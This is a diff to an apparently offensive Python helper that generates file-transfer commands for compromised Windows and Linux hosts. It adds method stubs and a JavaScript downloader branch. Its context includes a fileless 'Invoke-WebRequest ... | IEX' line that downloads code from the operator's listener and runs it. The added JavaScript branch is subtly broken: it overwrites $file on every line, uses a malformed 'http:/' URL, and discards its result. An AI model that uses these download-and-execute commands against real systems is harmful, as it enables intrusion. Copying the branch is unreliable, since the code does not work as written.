@@ -16,13 +16,18 @@ from getpass import getpass
 UploadTo_WinMethods = [
     'HTTP',
     'SCP',
-    'Base64'
+    'Base64',
+    # 'SMB',
+    # 'FTP',
 ]
 
-# UPLOAD FROM WINDOWS TARGET METHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
+# UPLOAD FROM WINDOWS TARGET METHODS
 UploadFrom_WinMethods = [
     'Base64',
-    'UploadServer'
+    'UploadServer',
+    # 'SMB',
+    # 'FTP',
+    # 'WebDAV',
 ]
 
 # POWERSHELL UPLOAD TO, METHODS
@@ -49,9 +54,12 @@ UploadTo_NixMethods = [
     'SCP'
 ]
 
-# UPLOAD FROM LINUX TARGET METHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
+# UPLOAD FROM LINUX TARGET METHODS
 UploadFrom_NixMethods = [
-    'Base64'
+    'Base64',
+    # 'SMB',
+    # 'FTP',
+    # 'WebDAV',
 ]
 
 # DOWNLOAD METHODS
@@ -379,6 +387,18 @@ def upload_to(args):
                 print('[+] Invoke-WebRequest - Fileless method selected')
                 startcmd = 'Invoke-WebRequest http://' + listen_ip + ':' + listen_port + '/' + args.filename
                 endcmd = ' | IEX'
+            elif choice == 'JavaScript':
+                print('[+] JavaScript method selected')
+                cmd = '\$file = \'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");\''
+                cmd += '\$file = \'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);\''
+                cmd += '\$file = \'WinHttpReq.Send();\''
+                cmd += '\$file = \'BinStream = new ActiveXObject("ADODB.Stream");\''
+                cmd += '\$file = \'BinStream.Type = 1;\''
+                cmd += '\$file = \'BinStream.Open();\''
+                cmd += '\$file = \'BinStream.Write(WinHttpReq.ResponseBody);\''
+                cmd += '\$file = \'BinStream.SaveToFile(WScript.Arguments(1));\''
+                cmd += '\$file | Out-File http:/' + listen_ip + ':' + listen_port + '/' + args.filename + ' ' + args.filename
+
             else:
                 print('[!] Invalid choice')
             cmd = startcmd + endcmd
